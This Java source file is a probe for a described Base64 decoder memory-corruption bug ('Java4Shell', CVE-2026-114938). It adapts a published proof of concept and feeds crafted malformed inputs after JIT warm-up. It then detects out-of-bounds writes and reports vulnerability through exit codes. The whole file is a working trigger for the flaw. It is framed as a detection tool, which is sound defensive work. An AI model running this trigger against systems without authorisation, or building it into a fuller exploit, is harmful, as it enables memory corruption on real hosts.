import java.nio.charset.Charset;
import java.util.Arrays;
import java.util.Base64;

/**
 * Bounded probe for CVE-2026-114938 (Java4Shell).
 *
 * This is a generalization of Calif's published proof of concept
 * (https://calif.io/java4shell). Calif's original trigger hard-codes a tail of
 * 64*'A' + '=' and fixed offsets (50..111). This probe also tries 128*'A' + '=';
 * the matrix needed the longer tail on JDK 17-20. Trigger lengths depend on
 * the build and compiled path.
 *
 * Observed decoder writes land inside one oversized 4096-byte array.
 * Here "out of bounds" is relative to
 * the *logical output length* the decoder computed for its result, not relative to the
 * backing array. This keeps the observed overwrite inside the array, but is not a
 * safety guarantee for untested JVM implementations. Use a test host.
 *
 * Targets Java 8 bytecode and public APIs; untested JVM builds remain unverified.
 *
 * Exit codes:
 *   7  -> VULNERABLE (out-of-bounds write observed)
 *   0  -> NOT-VULNERABLE (no overwrite observed in these probes, not proof of safety)
 *   2  -> inconclusive / error
 */
public final class Java4ShellProbe {
    private static volatile int sink;
    private static final Charset ASCII = Charset.forName("US-ASCII");

    private static int ceilDiv(int a, int b) { return (a + b - 1) / b; }

    private static byte[] repeat(char c, int n) {
        byte[] b = new byte[n];
        Arrays.fill(b, (byte) c);
        return b;
    }

    /** @return changed bytes beyond the calculated output length, inside the backing array. */
    private static int trigger(Base64.Decoder dec, int numA, int warmIters) {
        int inputLen = numA + 1;                        // numA 'A' chars + one '='
        int bufferLen = ceilDiv(inputLen, 4) * 3 - 1;   // size the decoder allocates for output

        byte[] valid = repeat('A', numA);
        byte[] malformed = new byte[numA + 1];
        Arrays.fill(malformed, (byte) 'A');
        malformed[numA] = (byte) '=';

        byte[] target = new byte[4096];
        for (int i = 0; i < warmIters; i++) sink += dec.decode(valid, target); // encourage C2 compilation

        Arrays.fill(target, (byte) 0x5a);
        boolean rejected = false;
        try {
            dec.decode(malformed, target);
        } catch (IllegalArgumentException expected) {
            rejected = true;
        }

        int changed = 0, first = -1, last = -1;
        for (int i = bufferLen; i < target.length; i++) {
            if (target[i] != (byte) 0x5a) { changed++; if (first < 0) first = i; last = i; }
        }
        System.out.printf("  tail=%dA+'='  bufferLen=%d  rejected=%s  oobBytes=%d  range=[%d..%d]%n",
                numA, bufferLen, rejected, changed, first, last);
        return changed;
    }

    public static void main(String[] args) {
        int warm = args.length > 0 ? Integer.parseInt(args[0]) : 400_000;
        try {
            Base64.Decoder dec = Base64.getDecoder();

            System.out.println("runtime=" + System.getProperty("java.runtime.version"));
            System.out.println("vm=" + System.getProperty("java.vm.name"));
            System.out.println("os.arch=" + System.getProperty("os.arch"));

            int oob64 = trigger(dec, 64, warm);
            int oob128 = trigger(dec, 128, warm);
            int maxOob = Math.max(oob64, oob128);

            String trig = oob64 > 0 ? "64A" : oob128 > 0 ? "128A" : "none";
            System.out.println("VERDICT=" + (maxOob > 0 ? "VULNERABLE" : "NOT-VULNERABLE")
                    + " maxOobBytes=" + maxOob + " trigger=" + trig);
            System.exit(maxOob > 0 ? 7 : 0);
        } catch (Throwable t) {
            System.out.println("VERDICT=ERROR " + t);
            System.exit(2);
        }
    }
}
